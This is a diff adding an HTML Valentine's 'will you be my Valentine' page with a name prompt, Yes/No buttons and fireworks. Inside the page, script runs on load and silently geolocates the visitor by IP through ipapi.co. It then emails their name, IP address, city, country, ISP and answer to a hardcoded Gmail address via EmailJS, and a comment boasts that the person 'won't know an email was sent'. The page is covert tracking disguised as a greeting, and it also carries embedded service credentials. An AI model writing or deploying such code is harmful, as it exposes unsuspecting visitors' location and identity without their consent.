@@ -1,0 +1,511 @@
+
+<!doctype html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>For Someone Special 💖</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
+
+      body {
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: linear-gradient(135deg, #ff758c, #ff7eb3);
+        overflow: hidden;
+      }
+
+      .container {
+        backdrop-filter: blur(15px);
+        background: rgba(255, 255, 255, 0.2);
+        padding: 50px;
+        border-radius: 25px;
+        text-align: center;
+        box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
+        color: white;
+        display: none; /* Initially hidden until name is entered */
+      }
+
+      /* Name input screen */
+      .name-input-container {
+        backdrop-filter: blur(15px);
+        background: rgba(255, 255, 255, 0.2);
+        padding: 50px;
+        border-radius: 25px;
+        text-align: center;
+        box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
+        color: white;
+        max-width: 400px;
+        width: 90%;
+      }
+
+      .name-input-container h2 {
+        margin-bottom: 20px;
+        font-size: 28px;
+      }
+
+      .name-input-container p {
+        margin-bottom: 30px;
+        font-size: 16px;
+        opacity: 0.9;
+      }
+
+      .name-input {
+        width: 100%;
+        padding: 15px 20px;
+        border: none;
+        border-radius: 30px;
+        font-size: 16px;
+        margin-bottom: 20px;
+        background: rgba(255, 255, 255, 0.9);
+        color: #333;
+        text-align: center;
+        font-family: "Poppins", sans-serif;
+      }
+
+      .name-input:focus {
+        outline: none;
+        background: white;
+        box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+      }
+
+      .continue-btn {
+        width: 100%;
+        padding: 15px;
+        border: none;
+        border-radius: 30px;
+        font-size: 16px;
+        cursor: pointer;
+        background: white;
+        color: #ff4e8a;
+        font-weight: 600;
+        font-family: "Poppins", sans-serif;
+        transition: 0.3s;
+      }
+
+      .continue-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+      }
+
+      .continue-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
+      }
+
+      h2 {
+        margin-bottom: 15px;
+      }
+      h3 {
+        margin-bottom: 30px;
+        font-weight: 300;
+      }
+
+      .buttons {
+        display: flex;
+        gap: 20px;
+        justify-content: center;
+      }
+
+      button {
+        padding: 12px 28px;
+        border: none;
+        border-radius: 30px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: 0.3s;
+      }
+
+      #yesBtn {
+        background: white;
+        color: #ff4e8a;
+        font-weight: 600;
+      }
+
+      #noBtn {
+        background: #333;
+        color: white;
+      }
+
+      /* Modal */
+      .modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.6);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        visibility: hidden;
+        opacity: 0;
+        transition: 0.3s;
+      }
+
+      .modal.active {
+        visibility: visible;
+        opacity: 1;
+      }
+
+      .modal-content {
+        background: white;
+        padding: 30px;
+        border-radius: 20px;
+        text-align: center;
+        width: 320px;
+        animation: pop 0.4s ease;
+      }
+
+      @keyframes pop {
+        from {
+          transform: scale(0.6);
+        }
+        to {
+          transform: scale(1);
+        }
+      }
+
+      .modal-content h3 {
+        margin-bottom: 20px;
+        color: #ff4e8a;
+      }
+
+      /* Fireworks */
+      .fire {
+        position: absolute;
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: white;
+        animation: blast 1s ease-out forwards;
+      }
+
+      @keyframes blast {
+        to {
+          transform: translate(var(--x), var(--y));
+          opacity: 0;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <!-- Name Input Screen (shown first) -->
+    <div class="name-input-container" id="nameInputScreen">
+      <h2>💕 Before we begin... 💕</h2>
+      <p>What should I call you?</p>
+      <input
+        type="text"
+        class="name-input"
+        id="nameInput"
+        placeholder="Enter your name here..."
+        maxlength="20"
+      />
+      <button class="continue-btn" id="continueBtn" disabled>
+        Continue ✨
+      </button>
+    </div>
+
+    <!-- Main Proposal Screen (hidden initially) -->
+    <div class="container" id="mainContainer">
+      <h2 id="question"></h2>
+      <div class="buttons">
+        <button id="yesBtn">Yes 💖</button>
+        <button id="noBtn">No 🙈</button>
+      </div>
+    </div>
+
+    <!-- Modal -->
+    <div class="modal" id="modal">
+      <div class="modal-content">
+        <h3 id="modalText"></h3>
+        <div class="buttons" id="modalButtons">
+          <button id="modalYes">Yes</button>
+          <button id="modalNo">No</button>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script>
+      /*
+=== EMAIL SETUP INSTRUCTIONS ===
+
+To enable email notifications when someone responds to your proposal:
+
+1. Go to https://www.emailjs.com and sign up for a free account
+2. Create a new email service (supports Gmail, Outlook, Yahoo, etc.)
+3. Create an email template with these variables:
+   - {{to_email}} (your email address)
+   - {{message}} (the notification message)
+   - {{from_name}} (the person's name)
+   - {{timestamp}} (when they responded)
+4. Get your Public Key from EmailJS dashboard
+5. Replace the placeholders below with your actual EmailJS credentials:
+   - YOUR_PUBLIC_KEY
+   - YOUR_SERVICE_ID  
+   - YOUR_TEMPLATE_ID
+   - your-email@example.com (your actual email)
+
+Free plan allows 200 emails per month - perfect for this use case!
+The person clicking won't know an email was sent - it happens silently.
+*/
+
+      // ================= CONFIG =================
+      let herName = "";
+      let userLocationData = {};
+
+      // EmailJS Configuration - Initialize on page load
+      (function () {
+        emailjs.init({
+          publicKey: "cSruXLN_JuDF8JIeJ",
+        });
+        console.log("EmailJS initialized successfully");
+
+        // Get user's location on page load
+        getUserLocation();
+
+        // Set up name input functionality
+        setupNameInput();
+      })();
+
+      // ================= NAME INPUT FUNCTIONALITY =================
+      function setupNameInput() {
+        const nameInput = document.getElementById("nameInput");
+        const continueBtn = document.getElementById("continueBtn");
+        const nameInputScreen = document.getElementById("nameInputScreen");
+        const mainContainer = document.getElementById("mainContainer");
+
+        // Enable/disable continue button based on input
+        nameInput.addEventListener("input", function () {
+          const name = this.value.trim();
+          continueBtn.disabled = name.length < 2;
+
+          if (name.length >= 2) {
+            continueBtn.style.backgroundColor = "#ff4e8a";
+            continueBtn.style.color = "white";
+          } else {
+            continueBtn.style.backgroundColor = "white";
+            continueBtn.style.color = "#ff4e8a";
+          }
+        });
+
+        // Handle Enter key press in name input
+        nameInput.addEventListener("keypress", function (e) {
+          if (e.key === "Enter" && !continueBtn.disabled) {
+            proceedToProposal();
+          }
+        });
+
+        // Handle continue button click
+        continueBtn.addEventListener("click", proceedToProposal);
+
+        function proceedToProposal() {
+          herName = nameInput.value.trim();
+
+          // Update the proposal question
+          document.getElementById("question").innerText =
+            herName + ", will you be my Valentine? 💖";
+
+          // Hide name input screen and show main proposal
+          nameInputScreen.style.display = "none";
+          mainContainer.style.display = "block";
+
+          console.log(`✨ Proceeding to proposal for: ${herName}`);
+        }
+
+        // Focus on name input when page loads
+        nameInput.focus();
+      }
+
+      // ================= LOCATION DETECTION =================
+      // Get user's IP address and location
+      async function getUserLocation() {
+        try {
+          console.log("🌍 Fetching user location...");
+
+          // Using ipapi.co for free IP geolocation
+          const response = await fetch("https://ipapi.co/json/");
+          const data = await response.json();
+
+          userLocationData = {
+            ip: data.ip || "Unknown",
+            city: data.city || "Unknown",
+            region: data.region || "Unknown",
+            country: data.country_name || "Unknown",
+            countryCode: data.country_code || "Unknown",
+            timezone: data.timezone || "Unknown",
+            isp: data.org || "Unknown",
+          };
+
+          console.log("📍 Location data received:", userLocationData);
+        } catch (error) {
+          console.log("❌ Failed to get location:", error);
+          userLocationData = {
+            ip: "Unable to detect",
+            city: "Unknown",
+            region: "Unknown",
+            country: "Unknown",
+            countryCode: "Unknown",
+            timezone: "Unknown",
+            isp: "Unknown",
+          };
+        }
+      }
+
+      // ================= EMAIL FUNCTIONALITY =================
+      function sendMail(msg) {
+        const locationInfo = `
+📍 IP Address: ${userLocationData.ip}
+🏙️ City: ${userLocationData.city}
+🗺️ Region: ${userLocationData.region}
+🌍 Country: ${userLocationData.country} (${userLocationData.countryCode})
+🕐 Timezone: ${userLocationData.timezone}
+🌐 ISP: ${userLocationData.isp}`;
+
+        const templateParams = {
+          to_email: "canbeusenothingtolose@gmail.com", // Replace with your email
+          message: msg,
+          from_name: `${herName} (${userLocationData.city}, ${userLocationData.country})`,
+          location_info: locationInfo,
+          ip_address: userLocationData.ip,
+          timestamp: new Date().toLocaleString(),
+        };
+
+        console.log("Attempting to send email with params:", templateParams);
+
+        // Send email silently (no user notification)
+        emailjs
+          .send("service_axzazw7", "template_qnz823v", templateParams)
+          .then(
+            function (response) {
+              console.log(
+                "✅ Email sent successfully!",
+                response.status,
+                response.text,
+              );
+            },
+            function (error) {
+              console.log("❌ Email failed to send:", error);
+              // Show more detailed error info
+              console.error("Error details:", error);
+            },
+          );
+      }
+
+      // ================= MODAL =================
+      let modal = document.getElementById("modal");
+      let modalText = document.getElementById("modalText");
+      let modalButtons = document.getElementById("modalButtons");
+      let modalYes = document.getElementById("modalYes");
+      let modalNo = document.getElementById("modalNo");
+
+      function openModal(text, showButtons = true) {
+        modalText.innerText = text;
+        modalButtons.style.display = showButtons ? "flex" : "none";
+        modal.classList.add("active");
+      }
+
+      function closeModal() {
+        modal.classList.remove("active");
+      }
+
+      // ================= YES MAIN BUTTON =================
+      document.getElementById("yesBtn").addEventListener("click", () => {
+        // Show message only (NO buttons)
+        openModal("happy ❤️", false);
+
+        launchFireworks();
+
+        // Send email notification silently
+        sendMail(`🎉 GOOD NEWS! ${herName} has ACCEPTED your proposal! 💖✨`);
+        console.log("Email notification sent for YES response");
+        setTimeout(closeModal, 3000);
+      });
+
+      // ================= NO MAIN BUTTON =================
+      let noStep = 0;
+
+      document.getElementById("noBtn").addEventListener("click", () => {
+        noStep = 1;
+        openModal("Are you sure? 🥺");
+
+        modalYes.onclick = handleNoFlow;
+        modalNo.onclick = closeModal;
+      });
+
+      function handleNoFlow() {
+        if (noStep === 1) {
+          noStep++;
+          openModal("pls");
+        } else if (noStep === 2) {
+          noStep++;
+          openModal("Last chance... final answer? 🥺💔");
+        } else {
+          sendMail(
+            `💔 Unfortunately, ${herName} has declined your proposal. Better luck next time!`,
+          );
+          openModal("Okay...😞", false);
+          setTimeout(closeModal, 3000);
+        }
+      }
+
+      // ================= FIREWORKS =================
+      function launchFireworks() {
+        const colors = ["#ff4e8a", "#ffd700", "#00eaff", "#ffffff", "#ff9800"];
+
+        for (let i = 0; i < 15; i++) {
+          // number of bursts
+
+          setTimeout(() => {
+            // random launch position
+            let originX = Math.random() * window.innerWidth;
+            let originY = Math.random() * window.innerHeight;
+
+            for (let j = 0; j < 40; j++) {
+              // particles per burst
+
+              let fire = document.createElement("div");
+              fire.classList.add("fire");
+
+              fire.style.position = "fixed";
+              fire.style.left = originX + "px";
+              fire.style.top = originY + "px";
+
+              fire.style.background =
+                colors[Math.floor(Math.random() * colors.length)];
+
+              let angle = Math.random() * 2 * Math.PI;
+              let distance = Math.random() * 300;
+
+              let x = Math.cos(angle) * distance + "px";
+              let y = Math.sin(angle) * distance + "px";
+
+              fire.style.setProperty("--x", x);
+              fire.style.setProperty("--y", y);
+
+              document.body.appendChild(fire);
+
+              setTimeout(() => fire.remove(), 1000);
+            }
+          }, i * 300); // delay between bursts
+        }
+      }
+    </script>
+  </body>
+</html>
